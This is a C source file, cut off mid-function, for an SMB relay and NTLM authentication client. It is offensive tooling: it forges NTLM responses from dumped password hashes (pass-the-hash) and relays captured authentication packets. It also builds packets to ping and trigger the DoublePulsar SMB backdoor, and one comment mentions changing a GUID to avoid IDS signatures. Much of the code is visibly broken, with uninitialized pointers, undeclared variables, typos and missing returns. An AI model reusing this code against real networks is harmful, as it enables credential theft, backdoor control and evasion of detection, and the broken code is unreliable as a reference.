#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <winsock.h>
#include <assert.h>
#pragma comment(lib,"ws2_32.lib")

typedef unsigned char uint8;
typedef unsigned short uint16;
typedef unsigned long uint32;

#define uchar unsigned char

#define CONNECT_TIMEOUT  10
#define SMBWAITTIMEOUT 5

#define GetNTLMPacketFromSmbPacket(a) ((char*)a+0x2b+4)
#define GetNTLMPacket3FromSmbPacket(a) ((char*)a+ sizeof(smheader) -sizeof(((smheader*)a)->buffer) +sizeof(SessionSetupAndX))

#define SREV(x) ((((x)&0xFF)<<8) | (((x)>>8)&0xFF))
//#define SREV htonl

/* some switch macros that do both store and read to and from SMB buffers */

#define RW_PCVAL(read,inbuf,outbuf,len) \
	{ if (read) { PCVAL (inbuf,0,outbuf,len); } \
	else      { PSCVAL(inbuf,0,outbuf,len); } }

#define RW_PIVAL(read,big_endian,inbuf,outbuf,len) \
	{ if (read) { if (big_endian) { RPIVAL(inbuf,0,outbuf,len); } else { PIVAL(inbuf,0,outbuf,len); } } \
	else      { if (big_endian) { RPSIVAL(inbuf,0,outbuf,len); } else { PSIVAL(inbuf,0,outbuf,len); } } }

#define RW_PSVAL(read,big_endian,inbuf,outbuf,len) \
	{ if (read) { if (big_endian) { RPSVAL(inbuf,0,outbuf,len); } else { PSVAL(inbuf,0,outbuf,len); } } \
	else      { if (big_endian) { RPSSVAL(inbuf,0,outbuf,len); } else { PSSVAL(inbuf,0,outbuf,len); } } }

#define RW_CVAL(read, inbuf, outbuf, offset) \
	{ if (read) { (outbuf) = CVAL (inbuf,offset); } \
	else      { SCVAL(inbuf,offset,outbuf); } }

#define RW_IVAL(read, big_endian, inbuf, outbuf, offset) \
	{ if (read) { (outbuf) = ((big_endian) ? RIVAL(inbuf,offset) : IVAL (inbuf,offset)); } \
	else      { if (big_endian) { RSIVAL(inbuf,offset,outbuf); } else { SIVAL(inbuf,offset,outbuf); } } }

#define RW_SVAL(read, big_endian, inbuf, outbuf, offset) \
	{ if (read) { (outbuf) = ((big_endian) ? RSVAL(inbuf,offset) : SVAL (inbuf,offset)); } \
	else      { if (big_endian) { RSSVAL(inbuf,offset,outbuf); } else { SSVAL(inbuf,offset,outbuf); } } }

#undef CAREFUL_ALIGNMENT

/* we know that the 386 can handle misalignment and has the "right"
   byteorder */
#ifdef __i386__
#define CAREFUL_ALIGNMENT 0
#endif

#ifndef CAREFUL_ALIGNMENT
#define CAREFUL_ALIGNMENT 1
#endif

#define CVAL(buf,pos) (((unsigned char *)(buf))[pos])
#define PVAL(buf,pos) ((unsigned)CVAL(buf,pos))
#define SCVAL(buf,pos,val) (CVAL(buf,pos) = (val))


#if CAREFUL_ALIGNMENT

#define SVAL(buf,pos) (PVAL(buf,pos)|PVAL(buf,(pos)+1)<<8)
#define IVAL(buf,pos) (SVAL(buf,pos)|SVAL(buf,(pos)+2)<<16)
#define SSVALX(buf,pos,val) (CVAL(buf,pos)=(val)&0xFF,CVAL(buf,pos+1)=(val)>>8)
#define SIVALX(buf,pos,val) (SSVALX(buf,pos,val&0xFFFF),SSVALX(buf,pos+2,val>>16))
#define SVALS(buf,pos) ((int16)SVAL(buf,pos))
#define IVALS(buf,pos) ((int32)IVAL(buf,pos))
#define SSVAL(buf,pos,val) SSVALX((buf),(pos),((uint16)(val)))
#define SIVAL(buf,pos,val) SIVALX((buf),(pos),((uint32)(val)))
#define SSVALS(buf,pos,val) SSVALX((buf),(pos),((int16)(val)))
#define SIVALS(buf,pos,val) SIVALX((buf),(pos),((int32)(val)))

#else /* CAREFUL_ALIGNMENT */

   /* this handles things for architectures like the 386 that can handle
	  alignment errors */
	  /*
		 WARNING: This section is dependent on the length of int16 and int32
		 being correct
	  */

	  /* get single value from an SMB buffer */
#define SVAL(buf,pos) (*(uint16 *)((char *)(buf) + (pos)))
#define IVAL(buf,pos) (*(uint32 *)((char *)(buf) + (pos)))
#define SVALS(buf,pos) (*(int16 *)((char *)(buf) + (pos)))
#define IVALS(buf,pos) (*(int32 *)((char *)(buf) + (pos)))

/* store single value in an SMB buffer */
#define SSVAL(buf,pos,val) SVAL(buf,pos)=((uint16)(val))
#define SIVAL(buf,pos,val) IVAL(buf,pos)=((uint32)(val))
#define SSVALS(buf,pos,val) SVALS(buf,pos)=((int16)(val))
#define SIVALS(buf,pos,val) IVALS(buf,pos)=((int32)(val))

#endif /* CAREFUL_ALIGNMENT */

//from SMBrelay.h
#define SmbPacketLen(a) (SREV(a->SmbMessageLength)+4)

//from smb.h
#define SMBPACKETLEN(x) ((x->SmbMessageLength) +4 )
#define SmbLength(ptr) (((ptr)->buffer - (uint8*)(ptr)) + (ptr)->bufIndex)

#define WORD unsigned short


#define NEGOTIATEPROTOCOLREQUEST 0x72
#define SESSIONSETUPANDX	0x73
#define SESSIONLOGOFF       0x74
#define TREECONNETANDX		0x75
#define SMBCLOSE			0x04

#define SMB_COM_OPEN                0x02
#define SMB_COM_TREE_CONNECT        0x70
#define SMB_COM_TREE_DISCONNECT     0x71
#define SMB_COM_NEGOTIATE           0x72
#define SMB_COM_SESSION_SETUP_ANDX  0x73
#define SMB_COM_LOGOFF_ANDX         0x74
#define SMB_COM_TREE_CONNECT_ANDX   0x75
#define SMB_COM_TRANSACTION2        0x32
#define SMB_COM_TRANS2        0x32
#define SMB_COM_TRANSACTION2_SECONDARY 0x33
#define SMB_COM_TRANS2_SECONDARY 0x33
//SESSIONSETUPANDX Subcommands
#define CONTINUERESPONSE 1
#define ERRORRESPONSE	 2


#pragma pack(1)
typedef struct {
	uint16 SmbMessageType; //0x00
	uint16 SmbMessageLength;
	uint8 ProtocolHeader[4]; //"\xffSMB"
	uint8 SmbCommand;
	uint32 NtStatus; //0x00000000
	uint8 flags; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16 flags2;  //0xC001 (Unicode & Nt error types & longfilename support
	uint16 ProcessIDHigh; //0x00
	uint8 signature[8]; //0x00000000000
	uint16 reserved; //0x0000
	uint16 TreeId;
	uint16 ProccessID; //0xfeff
	uint16 UserID;
	uint16 multipleID;  //Incremental 64bytes en cada request.
	char buffer[16384]; // Custom SmbCommand data
} smheader;

typedef struct {
	uint8 WordCount; //Number of parameters in this struct
	uint8 AndXCommand; //0xff no further command
	uint8 reserved2; //0x00
	uint16 AndXOffset;

	uint16 MaxBuffer;
	uint16 MaxMpxCount;
	uint16 VcNumber; //0x0000
	uint32 SessionKey; //0x00000000
	uint16 SecurityBloblength;
	uint32 reserved3; //0x00000000
	uint32 capabilities; //0x200000D4
	uint16 ByteCount;
} SessionSetupAndX;

typedef struct {
	uint8 WordCount; //Number of parameters in this struct
	uint8 AndXCommand; //0xff no further command
	uint8 reserved2; //0x00
	uint16 AndXOffset;
	uint16 Action;
	uint16 SecurityBloblength;
	uint16 ByteCount;
	//	uint8 padding;
} SessionSetupAndXResponse;

/*
typedef struct {
	uint8 BufferFormat;
	char  Name[256];
} DIALECT;
*/
typedef struct {
	uint8 BufferFormat;
	char* Name;
} DIALECT;

typedef struct
{
	uint16  len;
	uint16  maxlen;
	uint32  offset;
}tSmbStrHeader;


typedef struct
{
	char          ident[8];
	uint32        msgType;
	uint32        flags;
	tSmbStrHeader    host;
	tSmbStrHeader    domain;
	uint8         buffer[1024];
	uint32        bufIndex;
}tSmbNtlmAuthRequest;


typedef struct {
	uint8 WordCount;
	uint16 ByteCount;
	//	DIALECT *Dialects;
	char* Dialects;
} NegotiateProtocolRequest;

typedef struct {
	uint8 WordCount; //Number of parameters in this struct
	uint16 DialecIndex;
	uint8 SecurityMode;
	uint16 MaxMxpCount;
	uint16 MaxVcs;
	uint32 MaxBufferSize;
	uint32 MaxRawBuffer;
	uint32 SessionKey;
	uint32 Capabilities;
	//uint64 ServerTime;
	uint8  ServerTime[8];
	uint16 ServerTimeZone;
	uint8 KeyLength;
	uint16 ByteCount;
	uint8 ServerGuid[16];
} NegotiateProtocolResponse;


typedef struct {
	uint8 WordCount;
	uint8 AndXCommand; //0xff no further command
	uint8 reserved2; //0x00
	uint16 AndXOffset;
	uint16 flags;
	uint16 PasswordLen;	//Set to 0x01
	uint16 ByteCount;
	uint8 Password; //Set to 0x00
	//resource
	//service ????\0
} TreeConnectAndX;

typedef struct {
	uint8 WordCount;
	uint16 ByteCount;
} TreeConnectAndXResponse;


typedef struct {
	uint8 WordCount; //0x24
	uint16 FID; //0xff no further command
	uint32 LastWrite;
	uint16 ByteCount;
} CLOSE;

/*
typedef struct {
	uint8 WordCount;
	uint16 TotalParameterCount;
	uint16 TotalDataCount;
	uint16 MaxParameterCount;
	uint16 MaxDataCount;
	uint8 MaxSetupCount;
	uint8 reserved;
	uint16 flags;
	uint32 timeout; //0x00000000
	uint16 reserved2;
	uint16 ParameterCount;
	uint16 ParameterOffset;
	uint16 DataCount;
	uint16 DataOffset;
	uint8 SetupCount;
	uint8 reserved3;
	uint16 Function;
	uint16 FID;
	uint16 ByteCount;
	uint8 padding;
	uint8 TransactionName[14];
	uint16 padding2;
} SMB_COM_TRANSACTION_STRUCT; */


typedef struct {
	uint8 WordCount;
	uint16 TotalParameterCount;
	uint16 TotalDataCount;
	uint16 MaxParameterCount;
	uint16 MaxDataCount;
	uint8 MaxSetupCount;
	uint8 reserved;
	uint16 flags;
	uint32 timeout; //0x00000000
	uint16 reserved2;
	uint16 ParameterCount;
	uint16 ParameterOffset;
	uint16 DataCount;
	uint16 DataOffset;
	uint8 SetupCount;
	uint8 reserved3;
	uint16 Function; //0x000e
	//uint16 FID;
	uint16 ByteCount;
	uint8 padding;
	//uint8 TransactionName[14];
	uint16 padding2;
	uint8 parameters[12];
	uint8 SMBData[4096];
} SMB_COM_TRANS2_STRUCT;


typedef struct {
	uint8 WordCount;
	uint16 TotalParameterCount;
	uint16 TotalDataCount;
	uint16 MaxParameterCount;
	uint16 MaxDataCount;
	uint8 MaxSetupCount;
	uint8 reserved;
	uint16 flags;
	uint32 timeout; //0x00000000
	uint16 reserved2;
	uint16 ParameterCount;
	uint16 ParameterOffset;
	uint16 DataCount;
	uint16 DataOffset;
	uint8 SetupCount;
	uint8 reserved3;
	uint16 Function; //0x000e
	//uint16 FID;
	uint16 ByteCount;
	uint8 padding;
	//uint8 TransactionName[14];
	uint16 padding2;
	uint8 parameters[12];
	uint8 SMBData[4096];
} SMB_COM_TRANSACTION_STRUCT;

typedef struct {
	uint8 WordCount;
	uint16 TotalParameterCount;
	uint16 TotalDataCount;
	uint16 MaxParameterCount;
	uint16 MaxDataCount;
	uint8 MaxSetupCount;
	uint8 reserved;
	uint16 flags;
	uint32 timeout; //0x00000000
	uint16 reserved2;
	uint16 ParameterCount;
	uint16 ParameterOffset;
	uint16 DataCount;
	uint16 DataOffset;
	uint8 SetupCount;
	uint8 reserved3;
	uint16 Function; //0x000e
	//uint16 FID;
	uint16 ByteCount;
	uint8 padding;
	//uint8 TransactionName[14];
	uint16 padding2;
	uint8 parameters[12];
} SMB_COM_TRANS2_DOUBLEPULSAR_PING_STRUCT;

typedef struct {
	uint8 WordCount;
	uint16 TotalParameterCount;
	uint16 TotalDataCount;
	uint16 MaxParameterCount;
	uint16 MaxDataCount;
	uint8 MaxSetupCount;
	uint8 reserved;
	uint16 flags;
	uint32 timeout; //0x00000000
	uint16 reserved2;
	uint16 ParameterCount;
	uint16 ParameterOffset;
	uint16 DataCount;
	uint16 DataOffset;
	uint8 SetupCount;
	uint8 reserved3;
	uint16 Function; //0x000e
	//uint16 FID;
	uint16 ByteCount;
	uint8 padding;
	//uint8 TransactionName[14];
	uint16 padding2;
	uint8 parameters[12];
	uint8 SMBData[4096];
} SMB_COM_TRANS2_DOUBLEPULSAR_EXEC_STRUCT;

typedef struct
{
	char          ident[8];
	uint32        msgType;
	tSmbStrHeader    uDomain;
	uint32        flags;
	uint8         challengeData[8];
	uint8         reserved[8];
	tSmbStrHeader    emptyString;
	uint8         buffer[16384];
	//uint32        bufIndex;
}tSmbNtlmAuthChallenge;


typedef struct
{
	SOCKET source;
	struct sockaddr_in sourceaddr;

	SOCKET destination;
	struct sockaddr_in destinationaddr;

	int dstProtocol;
	char hostname[256];
} RELAY;

typedef struct
{
	char ident[8];
	uint32 msgType;
	tSmbStrHeader lmResponse;
	tSmbStrHeader ntResponse;
	tSmbStrHeader uDomain;
	tSmbStrHeader uUser;
	tSmbStrHeader uWks;
	tSmbStrHeader sessionKey;
	uint32 flags;
	uint8 buffer[1024];
	uint32 bufIndex;
} tSmbNtlmAuthResponse;

static unsigned char* strToUnicode(char* p)
{
	static unsigned char buf[16384];
	size_t l = strlen(p);
	int i = 0;

	assert(l * 2 < sizeof buf);

	while (l--)
	{
		buf[i++] = *p++;
		buf[i++] = 0;
	}

	return buf;
}

static char* unicodeToString(char* p, size_t len)
{
	int i;
	static char buf[16384];

	assert(len + 1 < sizeof buf);

	for (i = 0; i < (signed int)len; ++i)
	{
		buf[i] = *p & 0x7f;
		p += 2;
	}

	buf[i] = '\0';
	return buf;
}


#define GetUnicodeString(structPtr, header) \
unicodeToString(((char*)structPtr) + IVAL(&structPtr->header.offset,0) , SVAL(&structPtr->header.len,0)/2)
#define GetString(structPtr, header) \
toString((((char *)structPtr) + IVAL(&structPtr->header.offset,0)), SVAL(&structPtr->header.len,0))


#define AddBytes(ptr, header, buf, count) \
{ \
if (buf && count) \
  { \
  SSVAL(&ptr->header.len,0,count); \
  SSVAL(&ptr->header.maxlen,0,count); \
  SIVAL(&ptr->header.offset,0,((ptr->buffer - ((uint8*)ptr)) + ptr->bufIndex)); \
  memcpy(ptr->buffer+ptr->bufIndex, buf, count); \
  ptr->bufIndex += count; \
  } \
else \
  { \
  ptr->header.len = \
  ptr->header.maxlen = 0; \
  SIVAL(&ptr->header.offset,0,ptr->bufIndex); \
  } \
}

#define AddString(ptr, header, string) \
{ \
char *p = string; \
int len = 0; \
if (p) len = strlen(p); \
AddBytes(ptr, header, ((unsigned char*)p), len); \
}

#define AddUnicodeString(ptr, header, string) \
{ \
char *p = string; \
unsigned char *b = NULL; \
int len = 0; \
if (p) \
  { \
  len = strlen(p); \
  b = strToUnicode(p); \
  } \
AddBytes(ptr, header, b, len*2); \
}


//defines

//Build SMB Packet
smheader* BuildSmbPacket(smheader* PreviousSmbMessage, uint8 SmbCommand, uint8 SubCommand, void* data, int DataSize);
//Tree Connect
int BuildTreeConnectAndXStub(char* destination, char* password, char* resource, char* service);
//SMB Negotiation
//char* AddDialect(char* data, char* name, uint8 type, int* PacketSize);

char* AddDialect(char* data, char* name, uint8 type, int* PacketSize) {

	if (!data) {
		*PacketSize = 0;
		data = (char*)malloc(strlen(name) + 2);
	}
	else {
		data = (char*)realloc(data, *PacketSize + 2 + strlen(name));
	}
	//printf("PacketSize vale: %i\n",*PacketSize);
	data[*PacketSize] = type;
	strcpy((char*)&data[*PacketSize + 1], name);
	*PacketSize += 2 + strlen(name);
	return(data);
}

void buildAuthResponse(tSmbNtlmAuthChallenge* challenge, tSmbNtlmAuthResponse* response, long flags, char* user, char* password, char* domainname, char* host, tSmbNtlmAuthResponse* OptionalNtlmPacket3)
{

	//TODO: AÑADIR FLAGS!

	uint8 lmRespData[24];
	uint8 ntRespData[24];
	char* u = _strdup(user);
	char* p = strchr(u, '@');
	char* w = NULL;
	char* d = _strdup(GetUnicodeString(challenge, uDomain));
	char* domain = d;
	if ((domainname != NULL) && (strlen(domainname) > 0)) domain = domainname;


	if (host == NULL) host = "";
	w = _strdup(host);

	if (p)
	{
		domain = p + 1;
		*p = '\0';
	}
	else {
		p = strchr(u, '\\');
		if (p) {
			domain = u;
			u = _strdup(p + 1);
			p[0] = '\0';
		}
	}
	//if (!domain) domain="";

	if (OptionalNtlmPacket3 == NULL) {
		if (*password != ':')
		{
			//Create New LM and ntLM network Hash from password
			SMBencrypt((uchar*)password, challenge->challengeData, lmRespData);
			SMBNTencrypt((uchar*)password, challenge->challengeData, ntRespData);
		}
		else {
			//create LM and ntLM network Hash from pwdump NTLM Hash
			unsigned char hash[21];
			int i;
			char n, tmp[3];
			tmp[2] = '\0';
			for (i = 0; i < 16; i++) {
				memcpy(tmp, password + i * 2 + 1, 2);
				hash[i] = n = strtol(tmp, 0, 16);
			}
			memset(hash + 16, 0, 5);
			SMBOWFencrypt((unsigned char*)hash, challenge->challengeData, ntRespData);
			memcpy(lmRespData, ntRespData, sizeof(ntRespData));
		}
	}
	else {

#define ChallengeHash( structPtr, header) ((unsigned char*)structPtr)+IVAL(&structPtr->header.offset,0)
		memcpy(lmRespData, ChallengeHash(OptionalNtlmPacket3, lmResponse), sizeof(lmRespData));
		//HACK to avoid NTLMv2
		if (OptionalNtlmPacket3->ntResponse.len > 24) {
			printf("\n\nWARNING NTLMV2 packet\n\n");
			memcpy(ntRespData, ChallengeHash(OptionalNtlmPacket3, lmResponse), sizeof(ntRespData));
		}
		else {
			memcpy(ntRespData, ChallengeHash(OptionalNtlmPacket3, ntResponse), sizeof(ntRespData));
			//memcpy(ntRespData,(char*)OptionalNtlmPacket3 + OptionalNtlmPacket3->ntResponse.offset,sizeof(ntRespData) );//
		}
	}



	response->bufIndex = 0;
	memcpy((char*)response->ident, "NTLMSSP\0\0\0", 8);
	SIVAL(&response->msgType, 0, 3);
	AddBytes(response, lmResponse, lmRespData, 24);
	AddBytes(response, ntResponse, ntRespData, 24);
	AddUnicodeString(response, uDomain, domain);
	AddUnicodeString(response, uUser, u);
	AddUnicodeString(response, uWks, w);
	AddString(response, sessionKey, NULL);
	if (flags != 0) challenge->flags = flags; /* Overide flags! */
	else response->flags = 0x0000b207;
	if (d) free(d);
	if (u) free(u);

}

void BuildAuthRequest(tSmbNtlmAuthRequest* request, long flags, char* host, char* domain)
{
	char* h = NULL;//strdup(host);
	char* p = NULL;//strchr(h,'@');
	//TODO: review default flags

	if (host == NULL)   host = "";
	if (domain == NULL) domain = "";

	h = _strdup(host);
	p = strchr(h, '@');
	if (p)
	{
		if (!domain)
			domain = p + 1;
		*p = '\0';
	}
	if (flags == 0) flags = 0x0000b207; /* Lowest security options to avoid negotiation */
	request->bufIndex = 0;
	memcpy(request->ident, "NTLMSSP\0\0\0", 8);
	SIVAL(&request->msgType, 0, 1);
	SIVAL(&request->flags, 0, flags);

	assert(strlen(host) < 128);
	AddString(request, host, h);
	assert(strlen(domain) < 128);
	AddString(request, domain, domain);
	free(h);
}

void Widetochar(char* destination, char* source, int len)
{
	int i;
	for (i = 0; i < len / 2; i++)
	{
		destination[i] = (char)source[i * 2];
		if (destination[i] == '\0') return;
	}
	destination[i] = '\0';

}

void chartoWide(char* destination, char* source, int len)
{
	int i;
	for (i = 0; i < len; i++)
	{
		destination[i * 2] = (char)source[i];
	}

}

smheader* buildDoublePulsarPingPacket(smheader* PreviousSmbMessage)
{
	SMB_COM_TRANSACTION_STRUCT* TransRequest;
	smheader* NewSmbPacket;

	TransRequest = (SMB_COM_TRANSACTION_STRUCT*)malloc(sizeof(SMB_COM_TRANSACTION_STRUCT));
	memset((char*)TransRequest, '\0', sizeof(SMB_COM_TRANSACTION_STRUCT));
	NewSmbPacket->TreeId = ((smheader*)PreviousSmbMessage)->TreeId;
	TransRequest->WordCount = 16;
	TransRequest->TotalParameterCount = 0;
	TransRequest->MaxDataCount = 1024;
	TransRequest->MaxParameterCount = 0;
	TransRequest->MaxSetupCount = 0;
	TransRequest->reserved = 0;
	TransRequest->flags = 0;
	TransRequest->timeout = 0x00000000;
	TransRequest->reserved2 = 0;
	TransRequest->ParameterCount = 0;
	TransRequest->ParameterOffset = 84;
	TransRequest->DataOffset = 84;
	TransRequest->SetupCount = 2;
	TransRequest->reserved3 = 0;

	TransRequest->Function = 0x33;
	TransRequest->padding = 0;
	TransRequest->padding2 = 0;

	int parameters = 12;
	int DataSize = 4096; //dynamic based on sizeof(payload)

	NewSmbPacket->SmbMessageLength = (uint16)SREV(sizeof(smheader) - sizeof(NewSmbPacket->buffer) + sizeof(SMB_COM_TRANS2_STRUCT) + sizeof(parameters) + DataSize - 4);

	TransRequest->TotalDataCount = (uint16)sizeof(parameters) + DataSize;

	TransRequest->DataCount = TransRequest->TotalDataCount;
	TransRequest->ByteCount = TransRequest->TotalDataCount + 12;

	memcpy(NewSmbPacket->buffer, (char*)TransRequest, sizeof(SMB_COM_TRANSACTION_STRUCT));
	//memcpy(NewSmbPacket->buffer + sizeof(SMB_COM_TRANSACTION_STRUCT), (char*)dcerpc, sizeof(DceRpcRequest));
	//memcpy(NewSmbPacket->buffer + sizeof(SMB_COM_TRANSACTION_STRUCT) + sizeof(DceRpcRequest), (char*)data, DataSize);
	free(TransRequest);
}

smheader buildDoublePulsarExecPacket(smheader* PreviousSmbMessage)
{
	SMB_COM_TRANSACTION_STRUCT *TransRequest;
	smheader* NewSmbPacket;
	TransRequest = (SMB_COM_TRANSACTION_STRUCT*)malloc(sizeof(SMB_COM_TRANSACTION_STRUCT));
	memset((char*)TransRequest, '\0', sizeof(SMB_COM_TRANSACTION_STRUCT));
	NewSmbPacket->TreeId = ((smheader*)PreviousSmbMessage)->TreeId;
	TransRequest->WordCount = 16;
	TransRequest->TotalParameterCount = 0;
	TransRequest->MaxDataCount = 1024;
	TransRequest->MaxParameterCount = 0;
	TransRequest->MaxSetupCount = 0;
	TransRequest->reserved = 0;
	TransRequest->flags = 0;
	TransRequest->timeout = 0x00000000;
	TransRequest->reserved2 = 0;
	TransRequest->ParameterCount = 0;
	TransRequest->ParameterOffset = 84;
	TransRequest->DataOffset = 84;
	TransRequest->SetupCount = 2;
	TransRequest->reserved3 = 0;

	TransRequest->Function = 0x33;
	TransRequest->padding = 0;
	TransRequest->padding2 = 0;

	int parameters = 12;
	int DataSize = 4096;

	NewSmbPacket->SmbMessageLength = (uint16)SREV(sizeof(smheader) - sizeof(NewSmbPacket->buffer) + sizeof(SMB_COM_TRANS2_STRUCT) + sizeof(parameters) + DataSize - 4);

	TransRequest->TotalDataCount = (uint16)sizeof(parameters) + DataSize;

	TransRequest->DataCount = TransRequest->TotalDataCount;
	TransRequest->ByteCount = TransRequest->TotalDataCount + 12;

	memcpy(NewSmbPacket->buffer, (char*)TransRequest, sizeof(SMB_COM_TRANSACTION_STRUCT));
	//memcpy(NewSmbPacket->buffer + sizeof(SMB_COM_TRANSACTION_STRUCT), (char*)dcerpc, sizeof(DceRpcRequest));
	//memcpy(NewSmbPacket->buffer + sizeof(SMB_COM_TRANSACTION_STRUCT) + sizeof(DceRpcRequest), (char*)data, DataSize);
	free(TransRequest);
}

int BuildTreeConnectAndXStub(char* destination, char* password, char* resource, char* service)
{
	TreeConnectAndX* message = (TreeConnectAndX*)destination;
	smheader* foo;
	message->WordCount = (uint16)4;
	message->AndXCommand = 0xff;
	message->reserved2 = 0;
	message->AndXOffset = sizeof(TreeConnectAndX) + strlen(password) + strlen(service) + 1 + (strlen((char*)resource) + 1) * sizeof(WCHAR) + sizeof(smheader) - sizeof(foo->buffer) - 4;
	message->flags = 0x8;
	message->PasswordLen = strlen(password) + 1;
	message->ByteCount = (strlen(resource) + 1) * sizeof(WCHAR) + message->PasswordLen + strlen(service) + 1;
	memcpy((char*)&message->Password, password, message->PasswordLen);
	chartoWide((char*)&message->Password + message->PasswordLen, (char*)resource, (int)strlen((char*)resource) + 1);
	memcpy(destination + sizeof(TreeConnectAndX) + (strlen((char*)resource) + 1) * sizeof(WCHAR), service, strlen(service) + 1);//"\x3f\x3f\x3f\x3f\x3f\x00",6);

	return(sizeof(TreeConnectAndX) + strlen(password) + strlen(service) + 1 + (strlen((char*)resource) + 1) * sizeof(WCHAR));
}

int SendBytesAndWaitForResponse(SOCKET destination, char* source, int nBytes, char* destinationBuffer, int MaxReadSize, int timeout)
{
	int i = -1;
#ifdef WIN32
	u_long tmp = 1;
#else
	int tmp = 1;
#endif
	fd_set fds;
	struct timeval tv;

	//    if (send(destination, source, nBytes,0) >0) {
	if (timeout > 0)
	{
#ifdef WIN32
		ioctlsocket(destination, FIONBIO, &tmp);
#else
		ioctl(destination, FIONBIO, (char*)&tmp);
#endif
		send(destination, source, nBytes, 0);
		tv.tv_sec = timeout;
		tv.tv_usec = 0;
		FD_ZERO(&fds);
		FD_SET(destination, &fds);
		//printf("Esperando Timeout: %i\n",timeout);
		i = select((int)destination + 1, &fds, 0, 0, &tv);
		//printf("saliendo select: %i\n",i);
		if (i <= 0) return(-1);
	}
	else {
		send(destination, source, nBytes, 0);
	}
	i = recv(destination, (char*)destinationBuffer, MaxReadSize, 0);
	if (timeout > 0)
	{
		tmp = 0;
#ifdef WIN32
		ioctlsocket(destination, FIONBIO, &tmp);
#else
		ioctl(destination, FIONBIO, (char*)&tmp);
#endif
	}

	return(i);
}

smheader* BuildSmbPacket1(void)
{
	char buf2[4096];
	smheader* SmbPacket1;
	memset((char*)buf2, '\0', sizeof(buf2));
	BuildAuthRequest((tSmbNtlmAuthRequest*)buf2, 0, NULL, NULL);
#ifdef _DBG_
	DumpMem((char*)buf2, SmbLength((tSmbNtlmAuthRequest*)buf2));
#endif
	SmbPacket1 = BuildSmbPacket((smheader*)NULL, SESSIONSETUPANDX, 0, buf2, 40);

	return(SmbPacket1);
}
/*********************************************/
smheader GetSmbPacket2(RELAY* relay, smheader* Packet1)
{
	char* buffer = (char*)malloc(4096);
	int i;
	i = SendBytesAndWaitForResponse(relay->destination, (char*)Packet1, SmbPacketLen(Packet1), buffer, 4096, SMBWAITTIMEOUT);
	if (i > 0) {
		return((smheader*)buffer);
	}
	return(NULL);
}
/*********************************************/
smheader* GetSmbPacket3(smheader* SmbPacket2, char* lpUserName, char* lpPassword, char* domainname, char* host, tSmbNtlmAuthResponse* OptionalNtlmPacket3)
{
	char buf2[16384];
	smheader* SmbPacket3;
	memset((char*)buf2, '\0', sizeof(buf2));
	buildAuthResponse((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2), (tSmbNtlmAuthResponse*)buf2, 0, lpUserName, lpPassword, domainname, host, OptionalNtlmPacket3);
	//DumpMem((void*)buf2,sizeof(tSmbNtlmAuthResponse));
	SmbPacket3 = BuildSmbPacket((smheader*)SmbPacket2, SESSIONSETUPANDX, 0, buf2, (int)SmbLength((tSmbNtlmAuthResponse*)buf2));
	return(SmbPacket3);
}

smheader* BuildSmbPacket(smheader* PreviousSmbMessage, uint8 SmbCommand, uint8 SubCommand, void* data, int DataSize)
{
	smheader* NewSmbPacket;
	WCHAR tail1[18];
	WCHAR tail2[17];

	//Parameters Supported:
	SessionSetupAndX* SessionSetupAndXMessage;
	SessionSetupAndXResponse* SessionSetupAndXResponseMessage;
	//TreeConnectAndX  *TreeConnectAndXMessage;

	SMB_COM_TRANS2_STRUCT *Trans2;
	CLOSE* CloseMessage;
	uint16 MultipleID;



	NewSmbPacket = (smheader*)malloc(sizeof(smheader));
	memset((char*)NewSmbPacket, '\0', sizeof(smheader));
	NewSmbPacket->SmbMessageType = 0x0000;

	//0xFF for SMBv1 and 0xFE for SMBv2 (TODO)
	memcpy((char*)NewSmbPacket->ProtocolHeader, "\xff\x53\x4d\x42", 4); //"?SMB"
	NewSmbPacket->SmbCommand = SmbCommand;
	NewSmbPacket->flags = 0x18;
	NewSmbPacket->flags2 = 0xc803; //LOWEST SMB FLAGS with Unicode
	//NewSmbPacket->flags2=0x4803;
//    NewSmbPacket->flags2=0xc802;

	NewSmbPacket->ProccessID = 0xfeff;
	//NewSmbPacket->ProccessID=6666;
/*
	if (SmbCommand==SESSIONSETUPANDX) { //Init UserID value
		if (PreviousSmbMessage!=NULL)  {
			UserID=PreviousSmbMessage->UserID;
			printf("estableciendo UserID: %i\n",UserID);
		}
	}
	*/

	NewSmbPacket->UserID = UserID;
	NewSmbPacket->multipleID = MultipleID;
	MultipleID += 64;


	if (DataSize > sizeof(NewSmbPacket->buffer)) {
		NewSmbPacket = (smheader*)realloc(NewSmbPacket, sizeof(smheader) + DataSize);

	}



	switch (SmbCommand)
	{

	case NEGOTIATEPROTOCOLREQUEST:
		UserID = 0;
		MultpleID = 0;
		if (SubCommand == CONTINUERESPONSE) {
			/*
				Generates an SMB Negotiate Protocol Response.
				This packet is needed when acting as an SMB Server.
				NOTE: If the original reponse from the client is sent, the server could force logoff due to kerberos authentication failure.
				 so we need to create our own packet with an unknown Computer GUID
			*/
			NewSmbPacket->flags = 0x98;
			NegotiateProtocolResponse* NegotiateProtocolResponseMessage;
			NegotiateProtocolResponseMessage = (NegotiateProtocolResponse*)malloc(sizeof(NegotiateProtocolResponse));
			memset((char*)NegotiateProtocolResponseMessage, '\0', sizeof(NegotiateProtocolResponse));
			NewSmbPacket->SmbMessageLength = SREV(85);
			NegotiateProtocolResponseMessage->WordCount = 17;
			NegotiateProtocolResponseMessage->DialecIndex = 5; //grater than lanman2.1
			NegotiateProtocolResponseMessage->SecurityMode = 0x03; // User Security Mode + Password encrypted
			NegotiateProtocolResponseMessage->MaxMxpCount = 50;
			NegotiateProtocolResponseMessage->MaxVcs = 1;
			NegotiateProtocolResponseMessage->MaxBufferSize = 16644;
			NegotiateProtocolResponseMessage->MaxRawBuffer = 65536;
			NegotiateProtocolResponseMessage->SessionKey = 0x00000000;
			NegotiateProtocolResponseMessage->Capabilities = 0x8001f3fd;
			//FIX and set a valid ServerTime.
			//NegotiateProtocolResponseMessage->ServerTime=0; 
			NegotiateProtocolResponseMessage->ServerTimeZone = 0x0000;
			NegotiateProtocolResponseMessage->KeyLength = 0;
			NegotiateProtocolResponseMessage->ByteCount = 16;
			//TODO: Generate Random SMBRELAY Server GUID.
			//change it to avoid IDS Signatures :)
			memcpy(NegotiateProtocolResponseMessage->ServerGuid, "\xef\xea\x7f\x5b\xe2\x0a\x4e\x4d\xad\xee\xa6\\x29\x15\\xab", 16);
